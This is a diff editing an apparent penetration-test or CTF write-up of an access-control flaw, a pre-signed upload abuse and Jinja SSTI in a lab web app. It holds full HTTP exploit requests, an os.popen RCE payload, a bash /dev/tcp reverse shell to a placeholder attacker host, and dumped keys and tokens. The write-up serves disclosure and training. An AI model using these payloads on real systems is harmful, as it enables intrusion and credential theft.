@@ -33,17 +33,15 @@ As a result, the attacker can associate their authenticated user account with an
 
 ### Proof of Concept
 
-- Create an account on the platform.
-- Navigate to the TEAM tab and then create an invitation link. In our case, I've created a new account named Bob. Then created an invitation meant for Bob.
 
-<img width="1901" height="948" alt="image" src="https://github.com/user-attachments/assets/916b4f2d-24ed-4059-ad20-d0057e658c3d" />
+- Register or sign in to an account controlled by the tester.
+- In a workspace the tester controls, create an invitation for that account.
+- Open the invitation link and proceed to **Join Project**.
+
+<img width="1892" height="886" alt="image" src="https://github.com/user-attachments/assets/6ff3aaed-b8ed-40ca-9f91-2bbbb61316df" />
 
 
-
-- Access the generated link, we can observe that we can set the UUID of the project that we want to invite bob into, so we can replace it with the target/victim's UUID in the intercepted **POST request** when clicking "Join Team". As a result, Bob is invited as an Editor to the victim's workspace.
-
-<img width="1892" height="886" alt="image" src="https://github.com/user-attachments/assets/246aea05-46f8-4b30-a1c5-8de4bb799bbf" />
-
+- Intercept the membership **POST request** to **/api/data/project_memberships** and replace `project_id` value with the target workspace ID. Retain the current user's `user_id` and set `role` to `editor` as in the captured request.
 
 ```http
 POST /api/data/project_memberships HTTP/1.1
@@ -59,25 +57,24 @@ Authorization: Bearer {REDACTED}
 Content-Length: 118
 Origin: http://northline.prod.local:9080
 Connection: keep-alive
-
-{"project_id":"2f0fb497-eb2e-4eec-8fcb-b9e797d125e6","user_id":"421bda24-f8c0-4cbb-b673-51a77191a87f","role":"editor"}
+{
+  "project_id": "<target-project-id>",
+  "user_id": "<attacker-user-id>",
+  "role": "editor"
+}
 ```
 
+- Submit the request. The server returned `201 Created`.
+   
+<img width="1532" height="800" alt="image" src="https://github.com/user-attachments/assets/ba76f9b1-18a4-476e-a87e-e9679f6bb6b1" />
 
-<img width="1532" height="800" alt="image" src="https://github.com/user-attachments/assets/2a5d1f7a-42a0-4604-b708-77b59df7b373" />
-
-
-Observe that we get a **201 Created** response from the server. 
-
-We can confirm the effect by checking our dashboard, and observe that we have successfully invited ourselves into someone's workspace.
-
-<img width="1867" height="896" alt="image" src="https://github.com/user-attachments/assets/b2d1bbba-a0bf-4a75-ad86-31473e8ef60e" />
+- Refresh the dashboard and confirm that the account appears in the target workspace. Open the Team view to confirm the accessible member details.
 
 
+A successful response and subsequent dashboard access demonstrate that the membership was created in the target workspace.
 
-- Additionally, we can view the Personal Details such as Full Name and Email Address of the members of the compromised workspace via the Team tab.
+<img width="1867" height="896" alt="image" src="https://github.com/user-attachments/assets/73a74b8f-a31e-4fba-b491-174107d7067f" />
 
-<img width="1913" height="962" alt="image" src="https://github.com/user-attachments/assets/21acd9a5-b904-4e15-8ef3-cdb1206a49e2" />
 
 # Finding 2: 
 
@@ -94,67 +91,44 @@ As a result, the attacker can leverage the generated pre-signed URL to upload an
 
 ### Proof of Concept 
 
-- Checking the Templates web page, we can observe that it utilizes jinja rendering.
 
-<img width="1568" height="750" alt="image" src="https://github.com/user-attachments/assets/026c4f6d-3041-4a1c-a6cb-0d9838b14ac6" />
-
-- Using the exploit from the previous finding to obtain `editor` access to the workspace to be able to exploit this vulnerability.
-- To generate a valid AWS HMAC-SHA256 pre-signed **PUT** URL, send the following **POST request**:
+- Authenticate as a user with editor access to the target workspace. This access can be obtained through Vulnerability Finding 1 (Broken Access Control).
+- Send a signing request with a key targeting the workspace's rendering template. Record the `put_url` value from the server response. Do keep in mind to generate a fresh URL for each reproduction because the signature expires.
 
 ```http
-POST /api/projects/{target_workspace_uuid}/uploads/sign HTTP/1.1
+POST /api/projects/{project-id}/uploads/sign HTTP/1.1
 Host: northline.prod.local:9080
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
 Content-Type: application/json
-Authorization: Bearer {REDACTED}
-Content-Length: 71
-Origin: http://northline.prod.local:9080
-Connection: keep-alive
+Authorization: Bearer <access-token>
 
-{"key":"projects/{VICTIM_PROJECT_ID}/render/layout.html"}
-```
-
-<img width="1517" height="777" alt="image" src="https://github.com/user-attachments/assets/b4ff160b-ef5e-4fad-84d0-ab18ff280b37" />
-
-
-Observe that the server responded with a PUT URL that we can now use to modify the rendering template asset (**projects/{VICTIM_PROJECT_ID}/render/layout.html**). Make sure to take note of the value of the `put_url` parameter in the response.
-
-```http
-/nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T063241Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=e17693bef57d431c0d36bfcdaa1ae3d978f9dbfba0d05dc09dd13856e97c4415
+{"key":"projects/{target_project_id}/render/layout.html"}
 ```
 
 
-- To modify the rendering template asset, send the following **PUT request**, inserting the PUT URL parameters noted within the previous step.
+<img width="1517" height="777" alt="image" src="https://github.com/user-attachments/assets/3c45ec72-3056-44ee-8679-7adbdf3d4426" />
 
-*NOTE: Make sure to replace the `{REPLACE_PUT_URL_ENDPOINT}` in the request with the generated PUT URL endpoint. In our case, I have used the generated value within my session.*
+- Send a PUT request to that URL with a replacement HTML/Jinja template as the body.
 
 ```http
-PUT {REPLACE_PUT_URL_ENDPOINT} HTTP/1.1
+PUT {put_url-from-signing-response} HTTP/1.1
 Host: northline.prod.local:9080
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
 Content-Type: text/html
-Content-Length: 55
-Origin: http://northline.prod.local:9080
-Connection: keep-alive
 
-<h1>MODIFIED BY BOB</h1>
+<h1>Template modified for assessment</h1>
 <p>{{ site.description }}</p>
 ```
 
-<img width="1888" height="983" alt="image" src="https://github.com/user-attachments/assets/326f93f4-ed41-4db5-a190-a84b985a19ba" />
+<img width="1888" height="983" alt="image" src="https://github.com/user-attachments/assets/8b0a632d-8fcc-4457-82ae-44da57aaab66" />
+
+- In the Studio interface, trigger **Build → Generate Preview**. Then visit the generated preview and confirm that the modified template content appears.
+  
+<img width="1918" height="1002" alt="image" src="https://github.com/user-attachments/assets/3458da1c-f3d0-49df-9d9d-2ca856f47d27" />
 
 
-- We can observe the modified result by generating another preview via the BUILD -> Generate Preview. Then wait for the preview to be done, and when visited, we can now see that we have successfully modified the rendering template.
+Signing request (use the authorized project ID in the route and target object key from the CTF instance):
 
-<img width="1918" height="1002" alt="image" src="https://github.com/user-attachments/assets/0f2b32e7-d570-411c-9cee-6838a0dd346d" />
+
+*NOTE The initial replacement used harmless template content to verify that the object had been overwritten. The SSTI payload and worker impact are documented separately in [[Finding 3 - Writeup]].*
 
 
 
@@ -177,41 +151,45 @@ As a result, the attacker can access `self.__init__.__globals__.sys.modules['__m
 
 ### Proof of Concept
 
-- Using the unauthorized rendering template modification vulnerability from the previous finding, we can confirm that the web application is vulnerable to SSTI, by sending the following request.
+- Obtain editor access to the target workspace. In the complete chain, follow Finding 1 - Writeup.
+- Use the upload-signing flaw in Finding 2 - Writeup to replace `render/layout.html` with a test template.
+- We can verify template evaluation with a harmless expression or by sending the following **PUT request**
 
 ```http
-PUT /nl-assets/projects/{target_workspace_uuid}/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T040115Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=3cc5e2d6c0c930e1f33bda5e42f5e0c5f3ad8c0b9213e9e5fccd63694f4272e1 HTTP/1.1
+PUT {put_url-from-signing-response} HTTP/1.1
 Host: northline.prod.local:9080
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 Accept: */*
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Referer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
 Content-Type: text/html
-Content-Length: 44
+Content-Length: 236
 Origin: http://northline.prod.local:9080
 Connection: keep-alive
 
-<h1>MODIFIED BY BOB</h1>
+
+<h1>Template test</h1>
 <p>{{ 7 * 7 }}</p>
 ```
 
-<img width="1845" height="953" alt="image" src="https://github.com/user-attachments/assets/83960cc4-51b4-4ec0-a032-162b4e886a89" />
+- Trigger **Build → Generate Preview** in Studio and inspect the preview. The test rendered `49`, confirming expression evaluation.
 
-Observe that the operation we have included in the Rendering Template Body was processed.
+<img width="1845" height="953" alt="image" src="https://github.com/user-attachments/assets/2f3e1e10-658a-440f-b66e-e683f6e367a9" />
 
 
-- Moreover, we can try to read the Environment Variables by sending  the following **PUT request** 
+
+
+- Generate another preview and inspect its output. The returned process identity confirms command execution in the worker context. To do that, send the following **PUT request**
 
 ```http
-PUT /nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T063241Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=e17693bef57d431c0d36bfcdaa1ae3d978f9dbfba0d05dc09dd13856e97c4415 HTTP/1.1
+PUT {put_url-from-signing-response} HTTP/1.1
 Host: northline.prod.local:9080
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 Accept: */*
 Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, brReferer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
+Accept-Encoding: gzip, deflate, br
 Content-Type: text/html
-Content-Length: 107
+Content-Length: 236
 Origin: http://northline.prod.local:9080
 Connection: keep-alive
 
@@ -221,36 +199,44 @@ Connection: keep-alive
 </p>
 ```
 
+<img width="1878" height="902" alt="image" src="https://github.com/user-attachments/assets/f5a1af59-c122-44c2-a1f1-0534050ec3fd" />
 
-<img width="1878" height="902" alt="image" src="https://github.com/user-attachments/assets/ca1915fa-2c20-4a7e-bbc5-a51fe1706120" />
+
+As we can observe in the image above, we are able to read environment variables and worker files. Do not expose captured token, private-key, or registry-credential values in shared copies of the report.
 
 
-Observe that it contains internal API endpoints and tokens.
+- To initialize a basic Remote Code Execution, we can send the following **PUT request**, replacing the {INSERT_COMMAND} with the command you wish to run.
 
-- To initialize a basic Remote Code Execution, we can send the following **PUT request**, replacing the  `{INSERT_COMMAND}` with the command you wish to run.
- 
 ```http
-PUT /nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T070631Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=da055586c2fd550cb6bce25cfa1760bb7ac8767042821b8759c81cc538e5132f HTTP/1.1
-Host: northline.prod.local:9080
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
-Content-Type: text/html
-Content-Length: 118
-Origin: http://northline.prod.local:9080
-Connection: keep-alive
-
 <h1>{{ site.headline }}</h1>
 <p>
 {{ self.__init__.__globals__.sys.modules['__main__'].os.popen('{INSERT_COMMAND}').read() }}
 </p>
 ```
 
-In this case we tried running the command `env`, and retrieved the container environment variables seen earlier. 
+- In our case, we have obtained a reverse shell, allowing us to view the same environment file earlier.
+  
+```http
+PUT {put_url-from-signing-response} HTTP/1.1
+Host: northline.prod.local:9080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: text/html
+Content-Length: 236
+Origin: http://northline.prod.local:9080
+Connection: keep-alive
 
-```python
+<h1>{{ site.headline }}</h1>
+<p>
+{{ self.__init__.__globals__.sys.modules['__main__'].os.popen("setsid nohup bash -c 'bash -i >& /dev/tcp/{ATTACKER_SERVER}/{PORT} 0>&1 &' >/dev/null 2>&1 &").read() }}
+</p>
+```
+
+*Result*
+
+```bash
 HOSTNAME=7f137f0e869c
 WORKER_TOKEN=VeT8iX1PU251DWtkNdPHc0fzuiRU3Soq6FvdnTiJUtMu4oxtuH18rw
 HOME=/home/worker
@@ -266,39 +252,29 @@ PWD=/app
 API_INTERNAL_URL=http://api:8000
 ```
 
-- We have attempted to initiate a shell via the following **PUT request**, replacing the `{ATTACKER_SERVER}` and the `{PORT}` with the attacker's Server Domain/IP and the Port.
+<img width="775" height="181" alt="image" src="https://github.com/user-attachments/assets/12476517-dc0e-437f-bc95-dc7d4b3624d0" />
 
-```http
-PUT /nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261009%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261009T074042Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=aed9d8d1d61d5a9dd57b6bec67983353fac94607849f991aa09c4fd66b05db2d HTTP/1.1
-Host: northline.prod.local:9080
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: http://northline.prod.local:9080/studio/projects/236f85ce-0599-45d4-a34c-164c486dd4d9
-Content-Type: text/html
-Content-Length: 236
-Origin: http://northline.prod.local:9080
-Connection: keep-alive
+- Moreover, we have read access to the preview_key.pem and the registry_credentials
 
-<h1>{{ site.headline }}</h1>
-<p>
-{{ self.__init__.__globals__.sys.modules['__main__'].os.popen("setsid nohup bash -c 'bash -i >& /dev/tcp/{ATTACKER_SERVER}/{PORT} 0>&1 &' >/dev/null 2>&1 &").read() }}
-</p>
+```python
+worker@7f137f0e869c:/run/secrets$ ls
+preview_key.pem  registry_credentials  worker_ref
+worker@7f137f0e869c:/run/secrets$ cat preview_key.pem 
+-----BEGIN PRIVATE KEY-----
+MC4CAQAwBQYDK2VwBCIEIEMDEAFL976Oix9UDMZysrxwlVmYKXbsu0AclwzK55m+
+-----END PRIVATE KEY-----
+worker@7f137f0e869c:/run/secrets$ cat registry_credentials 
+preview-worker:tkDPW4xZ8wmWaPf1eucHqAf0cfBRgDNMzGjZLA
+worker@7f137f0e869c:/run/secrets$ 
 ```
 
-*screenshot*
+Additionally, we were able to read private key belonging to the compromised Worker, tokens and other form of credentials.
 
-<img width="775" height="181" alt="image" src="https://github.com/user-attachments/assets/251e3738-4c62-4a20-9e70-4b516b0f6039" />
-
-- Additionally we have also been able to read the `worker.py` source code via the following command:
+Moreover, the source code `/app/worker.py` was located and read.
 
 ```bash
 cat /app/worker.py
 ```
-
-
-*Result:*
 
 ```python
 from __future__ import annotations
@@ -392,22 +368,13 @@ if __name__ == "__main__":
     main()
 ```
 
-- Moreover, we have read access to the `preview_key.pem` and the `registry_credentials`
 
-```bash
-worker@7f137f0e869c:/run/secrets$ ls
-preview_key.pem  registry_credentials  worker_ref
-worker@7f137f0e869c:/run/secrets$ cat preview_key.pem 
------BEGIN PRIVATE KEY-----
-MC4CAQAwBQYDK2VwBCIEIEMDEAFL976Oix9UDMZysrxwlVmYKXbsu0AclwzK55m+
------END PRIVATE KEY-----
-worker@7f137f0e869c:/run/secrets$ cat registry_credentials 
-preview-worker:tkDPW4xZ8wmWaPf1eucHqAf0cfBRgDNMzGjZLA
-worker@7f137f0e869c:/run/secrets$ 
-```
 
-*Note: To ensure system stability, destructive actions (such as shutting down host services) were not performed.*
+## Impact
 
+An attacker with editor access to a target workspace can execute commands in the preview worker container with the privileges of the worker process. The assessment demonstrated access to worker environment variables, application source code, and mounted secret files. The worker also had access to internal service endpoints, increasing the potential impact if its network and credentials are not tightly constrained.
+
+*NOTE: No destructive actions or denial-of-service tests were performed. Arbitrary command execution could nevertheless disrupt or terminate worker processes, which is reflected in the provisional availability rating.*
 
 
 ---
